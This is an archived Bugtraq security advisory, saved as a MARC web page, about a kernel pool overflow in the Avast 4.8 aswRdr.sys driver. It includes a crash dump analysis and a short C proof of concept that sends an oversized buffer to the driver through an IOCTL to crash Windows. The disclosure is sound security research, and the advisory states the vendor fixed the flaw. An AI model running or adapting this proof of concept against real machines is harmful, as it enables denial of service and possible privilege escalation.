@@ -1,0 +1,276 @@
+From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
+Subject: 'Avast aswRdr.sys Kernel Pool Corruption and Local Privilege' - MARC
+Date: Wed, 2 Jun 2010 18:47:59 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="gb2312"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://marc.info/?l=bugtraq&m=125838877023803&w=2
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5931
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>'Avast aswRdr.sys Kernel Pool Corruption and Local =
+Privilege' - MARC</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dgb2312">
+<META content=3D"MSHTML 6.00.6000.17023" name=3DGENERATOR></HEAD>
+<BODY text=3D#000000 vLink=3D#800080 link=3D#0000c0 =
+bgColor=3D#ffffff><PRE><B>[<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D125838287610450&amp;w=3D2">=
+prev in list</A>] [<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D125838351012087&amp;w=3D2">=
+next in list</A>] [<FONT color=3D#c0c0c0>prev in thread</FONT>] [<FONT =
+color=3D#c0c0c0>next in thread</FONT>] </B>
+<B><FONT size=3D+1>
+List:       <A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;r=3D1&amp;w=3D2">bugtraq</A>
+Subject:    Avast aswRdr.sys Kernel Pool Corruption and Local Privilege
+From:       <A =
+href=3D"http://marc.info/?a=3D122089413600009&amp;r=3D1&amp;w=3D2">contac=
+t.fingers () gmail ! com</A>
+Date:       <A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;r=3D1&amp;w=3D2&amp;b=3D200911"=
+>2009-11-14 15:26:31</A>
+Message-ID: <A =
+href=3D"http://marc.info/?i=3D200911141526.nAEFQVkl005248%20()%20www3%20!=
+%20securityfocus%20!%20com">200911141526.nAEFQVkl005248 () www3 ! =
+securityfocus ! com</A></FONT>
+[<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D125838877023803&amp;q=3Draw=
+">Download message RAW</A>]</B>
+
+<A =
+href=3D"http://www.efblog.net/2009/11/avast-aswrdrsys-kernel-pool-corrupt=
+ion.html">http://www.efblog.net/2009/11/avast-aswrdrsys-kernel-pool-corru=
+ption.html</A>
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D[Avast aswRdr.sys Kernel Pool =
+Corruption and Local
+Privilege Escalation]=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+Author(s): Giuseppe 'Evilcry' Bonfa'
+    AbdulAziz Hariri
+
+E-Mail: evilcry {AT} GMAIL {DOT} COM
+Website:   <A =
+href=3D"http://evilcry.netsons.org/">http://evilcry.netsons.org/</A>
+    <A =
+href=3D"http://www.insight-tech.org/">http://www.insight-tech.org/</A>
+    <A =
+href=3D"http://evilcodecave.blogspot.com/">http://evilcodecave.blogspot.c=
+om/</A>
+    <A =
+href=3D"http://evilcodecave.wordpress.com/">http://evilcodecave.wordpress=
+.com/</A>
+
+
+Copyright 2009 Giuseppe Bonfa'. All rights reserved.
+
+
+***Disclosure Timeline***
+
+Discover Date: -
+PoC Code: porting C++ 26/09/2009
+Vendor Notify: 26/09/2009
+Vendor Reply: 15/09/2009
+Vendor Fix: 15/10/2009
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Product Details:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+Affected Product: Avast antivirus (other versions could be affected)
+Product Version: 4.8.1356.0
+Vulnerable Compoonent: aswRdr.sys 4.8.1356.0 (avast! TDI RDR Driver)
+Category: Local Denial of Service due to kernel memory corruption (BSOD)
+  (untested) Local Privilege Escalation
+
+Notes: Tested on XP Sp0-Sp2 fixed faulting process IExplorer 6
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Vulnerability Details:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+Avast's aswRdr.sys Driver does not sanitize user supplied input
+IOCTL) and this lead to Kernel Heap Overflow that propagates
+on the system with a BSOD and potential risk of Privilege Escalation.
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Technical Details:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+kd&gt; !analyze -v
+
+Bugcheck: BAD_POOL_HEADER
+
+Arg1: 00000020, a pool block header size is corrupt.
+Arg2: 8136c618, The pool entry we were looking for within the page.
+Arg3: 8136c778, The next pool entry. &lt;-- OVERWRITTEN HEADER
+Arg4: 1a2c0001, (reserved)
+
+POOL_ADDRESS: unable to get nt!MmSpecialPoolStart
+unable to get nt!MmSpecialPoolEnd
+unable to get nt!MmPoolCodeStart
+unable to get nt!MmPoolCodeEnd
+8136c618
+
+STACK_TEXT:
+WARNING: Stack unwind information not available. Following frames may be
+wrong.
+f7c70a18 80543c86 00000019 00000020 8136c618 nt+0x21925
+f7c70a68 804f388c 8136c620 00000000 81571de8 nt+0x6cc86
+f7c70abc 804fcfbf 81571de8 f7c70b08 f7c70afc nt+0x1c88c
+f7c70b0c 806d1c35 00000000 00000000 f7c70b24 nt+0x25fbf
+f7c70b24 806d1861 badb0d00 00000000 81603548 hal+0x2c35
+f7c70bb4 804f0498 81571de8 81348028 00000000 hal+0x2861
+f7c70be8 f76ee9ad 81347ec8 81565740 00000000 nt+0x19498
+f7c70c1c f76ee333 81347ec8 81571da8 81664e28 aswRdr+0x9ad
+f7c70c58 805749d1 81347ec8 81571da8 81348028 aswRdr+0x333
+f7c70d00 8056d33c 0000001c 00000000 00000000 nt+0x9d9d1
+f7c70d34 8053c808 0000001c 00000000 00000000 nt+0x9633c
+f7c70d64 7c91eb94 badb0d00 0012fee0 04040404 nt+0x65808
+f7c70d68 badb0d00 0012fee0 04040404 04040404 0x7c91eb94
+f7c70d6c 0012fee0 04040404 04040404 00000000 0xbadb0d00
+f7c70d70 04040404 04040404 00000000 00000000 0x12fee0
+f7c70d74 04040404 00000000 00000000 00000000 0x4040404
+f7c70d78 00000000 00000000 00000000 00000000 0x4040404
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Proof of Concept:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+Exploitation for Privilege Escalation is not Trivial but Possible
+
+
++------------------------------------------------------------------------=
+---+
+/* Avast 4.8.1356.0 antivirus aswRdr.sys Kernel Pool Corruption
+*
+* Author(s): Giuseppe 'Evilcry' Bonfa'
+*            AbdulAziz Hariri
+* E-Mail: evilcry _AT_ gmail _DOT_ com
+* Website: <A =
+href=3D"http://evilcry.netsons.org/">http://evilcry.netsons.org/</A>
+*          <A =
+href=3D"http://evilcodecave.blogspot.com/">http://evilcodecave.blogspot.c=
+om/</A>
+*          <A =
+href=3D"http://evilcodecave.wordpress.com/">http://evilcodecave.wordpress=
+.com/</A>
+*     <A href=3D"http://evilfingers.com/">http://evilfingers.com/</A>
+*
+*  Disclosure Timeline: As specified in the Advisory.
+*/
+
+#define WIN32_LEAN_AND_MEAN
+#include=20
+#include=20
+
+
+BOOL OpenDevice(PWSTR DriverName, HANDLE *lphDevice) //taken from =
+esagelab
+{
+ WCHAR DeviceName[MAX_PATH];
+ HANDLE hDevice;
+
+ if ((GetVersion() &amp; 0xFF) &gt;=3D 5)
+ {
+  wcscpy(DeviceName, L"\\\\.\\Global\\");
+ }
+ else
+ {
+  wcscpy(DeviceName, L"\\\\.\\");
+ }
+
+ wcscat(DeviceName, DriverName);
+
+ printf("Opening.. %S\n", DeviceName);
+
+ hDevice =3D CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0,
+NULL, OPEN_EXISTING,
+  FILE_ATTRIBUTE_NORMAL, NULL);
+
+ if (hDevice =3D=3D INVALID_HANDLE_VALUE)
+ {
+  printf("CreateFile() ERROR %d\n", GetLastError());
+  return FALSE;
+ }
+
+ *lphDevice =3D hDevice;
+
+ return TRUE;
+}
+
+int main()
+{
+ HANDLE hDev =3D NULL;
+ DWORD Junk;
+
+ if(!OpenDevice(L"aswRDR",&amp;hDev))
+ {
+  printf("Unable to access aswMon");
+  return(0);
+ }
+
+ char *Buff =3D (char *)VirtualAlloc(NULL, 0x156, MEM_RESERVE |
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+ if (Buff)
+ {
+  memset(Buff, 'A', 0x156);
+
+DeviceIoControl(hDev,0x80002024,Buff,0x156,Buff,0x156,&amp;Junk,(LPOVERLA=
+PPED)NULL);
+  printf("DeviceIoControl Executed..\n");
+ }
+ else
+ {
+  printf("VirtualAlloc() ERROR %d\n", GetLastError());
+ }
+
+
+ return(0);
+}
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D
+Credits:
+=3D=3D=3D=3D=3D=3D=3D=3D
+
+Vulnerability found and advisory written by Giuseppe 'Evilcry' Bonfa'
+and AbdulAziz Hariri.
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Disclaimer:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+The information within this advisory may change without notice. Use of =
+this \
+information constitutes acceptance for use in an AS IS condition. There =
+are no \
+warranties, implied or express, with regard to this information. In no =
+event shall \
+the author be liable for any direct or indirect damages whatsoever =
+arising out of or \
+in connection with the use or spread of this information. Any use of =
+this information \
+is at the user's own risk.
+
+
+<B>[<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D125838287610450&amp;w=3D2">=
+prev in list</A>] [<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D125838351012087&amp;w=3D2">=
+next in list</A>] [<FONT color=3D#c0c0c0>prev in thread</FONT>] [<FONT =
+color=3D#c0c0c0>next in thread</FONT>] </B>
+</PRE><PRE></PRE><BR>
+<CENTER><A href=3D"http://marc.info/?q=3Dconfigure">Configure</A> | <A=20
+href=3D"http://marc.info/?q=3Dabout">About</A> | <A=20
+href=3D"http://marc.info/?q=3Dnews">News</A> | <A=20
+href=3D"http://marc.info/?q=3Dabout#Begware">Donate</A> | <A=20
+href=3D"mailto:webguy@marc.info?subject=3DAdd a list to =
+MARC">Add&nbsp;a&nbsp;list</A>=20
+| Sponsors:&nbsp;<A href=3D"http://www.10east.com/">10East</A>,&nbsp;<A=20
+href=3D"http://www.korelogic.com/">KoreLogic</A>,&nbsp;<A=20
+href=3D"http://www.terra-intl.com/">Terra-International</A>,&nbsp;<A=20
+href=3D"http://www.chakpak.com/">Chakpak.com</A> </CENTER></BODY></HTML>
